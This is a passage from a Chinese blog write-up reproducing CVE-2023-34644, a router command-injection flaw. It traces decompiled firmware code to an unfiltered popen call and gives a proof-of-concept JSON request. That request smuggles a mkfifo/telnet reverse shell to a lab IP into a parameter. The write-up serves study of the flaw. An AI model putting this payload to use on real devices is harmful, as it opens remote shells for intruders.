--dword_4360A4;</span><br><span class="line">      &#125;</span><br><span class="line">      pthread_mutex_unlock(&amp;unk_4360B8);</span><br><span class="line">      *(_DWORD *)(a1 + <span class="number">12</span>) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v4 );</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span>) = dword_4360A0;</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">1</span>;</span><br><span class="line">    sub_41ADF0(v4);</span><br><span class="line">    *(_BYTE *)(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = *(_DWORD *)(v4 + <span class="number">52</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        <span class="built_in">free</span>(v5);</span><br><span class="line">      sub_41AD10(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      sem_post(v4 + <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">12</span>) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从sub_41AFC8函数中找到他的sem_wait函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_41ADF0</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// $v1</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">128</span>]; <span class="comment">// [sp+20h] [-8Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+A0h] [-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (a1[<span class="number">5</span>] &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(v1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3[<span class="number">14</span>] = result;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v1 + <span class="number">76</span>;</span><br><span class="line">    pthread_mutex_lock(v1 + <span class="number">76</span>);</span><br><span class="line">    <span class="keyword">if</span> ( _sigsetjmp(v4, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      pthread_mutex_unlock(v5);</span><br><span class="line">      _pthread_unwind_next(v4);</span><br><span class="line">    &#125;</span><br><span class="line">    _pthread_register_cancel(v4);</span><br><span class="line">    <span class="keyword">if</span> ( *a1 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[<span class="number">14</span>] = (*(<span class="type">int</span> (__fastcall **)(_DWORD *, _DWORD *))(*a1 + <span class="number">68</span>))(a1 + <span class="number">1</span>, a1 + <span class="number">13</span>);</span><br><span class="line">      <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">        uf_log_printf(</span><br><span class="line">          uf_log,</span><br><span class="line">          <span class="string">&quot;(%s %s %d)backgroup exec end[%s]&quot;</span>,</span><br><span class="line">          <span class="string">&quot;ufm_thd.c&quot;</span>,</span><br><span class="line">          <span class="string">&quot;exec_commit&quot;</span>,</span><br><span class="line">          <span class="number">220</span>,</span><br><span class="line">          (<span class="type">const</span> <span class="type">char</span> *)(*a1 + <span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(v5);</span><br><span class="line">    <span class="keyword">return</span> _pthread_unregister_cancel(v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_BYTE *)a1 + <span class="number">32</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      result = ufm_popen((<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>], a1 + <span class="number">13</span>);</span><br><span class="line">      v3 = a1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">    uf_fork_as(a1[<span class="number">7</span>]);</span><br><span class="line">    result = <span class="number">231</span>;</span><br><span class="line">    <span class="keyword">if</span> ( g_debug &gt;= <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> uf_log_printf(uf_log, <span class="string">&quot;(%s %s %d)uf_fork_as [%s]&quot;</span>, <span class="string">&quot;ufm_thd.c&quot;</span>, <span class="string">&quot;exec_commit&quot;</span>, <span class="number">231</span>, (<span class="type">const</span> <span class="type">char</span> *)a1[<span class="number">7</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现这里有个ufm_popen函数，而a1[7]显然是偏移28的位置</p>
<p>可以看到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v19 = strdup(a2);</span><br><span class="line">*(_DWORD *)(v7 + <span class="number">28</span>) = v19;               <span class="comment">// 将shell存在28的位置</span></span><br></pre></td></tr></table></figure>

<p>在async_cmd_push_queue函数中早已将shell存到了当前的位置，因此执行该shell，且没有任何的过滤，到此二进制文件的分析就结束了，但是我还是有些许的疑问</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;merge&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;sorry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.121.101 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="疑问-解决"><a href="#疑问-解决" class="headerlink" title="疑问&amp;解决"></a>疑问&amp;解决</h2><h4 id="为什么主机和qemu无法通信？"><a href="#为什么主机和qemu无法通信？" class="headerlink" title="为什么主机和qemu无法通信？"></a>为什么主机和qemu无法通信？</h4><p>首先问题算是一种特殊情况，因为tap0分配了两个ipv4地址，导致冲突</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr show tap0</span><br></pre></td></tr></table></figure>

<p>查看完后任意删除一个地址即可通信了，可能是重复配置的原因吧</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个漏洞是我复现的第二个漏洞，收获很多，第一次感受到路由器的组成，不过还是有着许多的坎坷，感受到了winmt师傅的强大，只能说连复现都那么坎坷，那如何寻找漏洞呢，这次复现给了我一个思路便是从可控字段出发，然后再从shell执行返回，找到交汇点，看起来在iot上我还有很多的路要走</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/e5651b4f.html">https://zikh26.github.io/posts/e5651b4f.html</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/437933584">https://zhuanlan.zhihu.com/p/437933584</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io">s1nec-1o</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/">http://s1nec-1o.github.io/2024/05/30/CVE-2023-34644%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://s1nec-1o.github.io" target="_blank">S1nec-1o's B1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/IOT%E5%AE%89%E5%85%A8/">IOT安全</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/11/%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%8F%90%E5%8F%96/" title="路由器的文件系统与提取"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">路由器的文件系统与提取</div></div></a></div><div class="next-post pull-right"><a href="/2024/05/26/Fuzz%E5%88%9D%E6%8E%A2/" title="Fuzz初探"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Fuzz初探</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/08/CVE-2018-7034%E5%A4%8D%E7%8E%B0/" title="CVE-2018-7034复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-08</div><div class="title">CVE-2018-7034复现</div></div></a></div><div><a href="/2024/05/21/DIR-815%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="DIR-815漏洞复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-21</div><div class="title">DIR-815漏洞复现</div></div></a></div><div><a href="/2024/07/12/CVE-2023-26315/" title="CVE-2023-26315"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-12</div><div class="title">CVE-2023-26315</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281614288.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">s1nec-1o</div><div class="author-info__description">万事胜意</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="http://github.com/s1nec-1o"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">正在学习iot pwn 欢迎广大师傅与我交流</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2023-34644"><span class="toc-number">1.</span> <span class="toc-text">CVE-2023-34644</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#luci%E6%A1%86%E6%9E%B6%E5%92%8Clua%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">luci框架和lua文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90noauth-lua-%E5%AF%BB%E6%89%BE%E5%8F%AF%E7%96%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%85%A5%E5%8F%A3"><span class="toc-number">1.1.1.</span> <span class="toc-text">分析noauth.lua(寻找可疑漏洞的入口)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">二进制文件分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uf-client-call"><span class="toc-number">1.2.1.</span> <span class="toc-text">uf_client_call</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Socket-%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">Socket 的类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unifyframe-sgi-elf"><span class="toc-number">1.2.3.</span> <span class="toc-text">unifyframe-sgi.elf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#parse-content"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">parse_content</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#parse-obj2-cmd"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">parse_obj2_cmd</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ufm-popen"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">ufm_popen</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uf-cmd-call"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">uf_cmd_call</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ufm-commit-add"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">ufm_commit_add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#async-cmd-push-queue"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">async_cmd_push_queue</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.3.5.1.</span> <span class="toc-text">详细分析</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">1.3.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%96%91%E9%97%AE-%E8%A7%A3%E5%86%B3"><span class="toc-number">1.4.</span> <span class="toc-text">疑问&amp;解决</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%BB%E6%9C%BA%E5%92%8Cqemu%E6%97%A0%E6%B3%95%E9%80%9A%E4%BF%A1%EF%BC%9F"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">为什么主机和qemu无法通信？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/03/%E5%9B%BA%E4%BB%B6%E4%B8%8B%E7%9A%84hook-patch/" title="固件下的hook &amp; patch">固件下的hook &amp; patch</a><time datetime="2025-03-03T08:26:16.000Z" title="发表于 2025-03-03 16:26:16">2025-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/21/how2heap/" title="how2heap">how2heap</a><time datetime="2025-02-21T12:41:20.000Z" title="发表于 2025-02-21 20:41:20">2025-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/" title="Hexagon学习">Hexagon学习</a><time datetime="2025-02-13T07:36:57.000Z" title="发表于 2025-02-13 15:36:57">2025-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/02/01/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2024年终总结">2024年终总结</a><time datetime="2025-02-01T08:50:35.000Z" title="发表于 2025-02-01 16:50:35">2025-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/23/%E5%88%9D%E6%8E%A2XSS/" title="初探XSS">初探XSS</a><time datetime="2025-01-23T06:06:48.000Z" title="发表于 2025-01-23 14:06:48">2025-01-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202404281616326.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By s1nec-1o</div><div class="footer_custom_text">介是s1nec-1o的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div><canvas id="snow" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;pointer-events:none"></canvas></div><script>const notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));</script><script async type="text/javascript" src="https://cdn.jsdelivr.net/gh/Candinya/Kratos-Rebirth@latest/source/js/snow.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>